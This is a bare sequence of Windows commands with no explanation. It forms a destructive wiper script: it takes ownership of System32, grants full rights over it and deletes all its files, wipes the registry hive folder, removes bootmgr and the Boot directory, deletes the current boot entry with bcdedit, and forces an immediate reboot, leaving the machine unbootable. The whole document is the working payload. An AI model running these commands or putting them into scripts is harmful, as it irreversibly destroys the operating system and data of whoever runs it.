takeown /f C:\Windows\System32\* /r /d y
icacls C:\Windows\System32\* /grant Administrators:F /t
del /f /s /q C:\Windows\System32\*.*
del /f /q C:\Windows\System32\config\*
del /f /q C:\bootmgr
rd /s /q C:\Boot
bcdedit /delete {current} /f
shutdown /r /t 0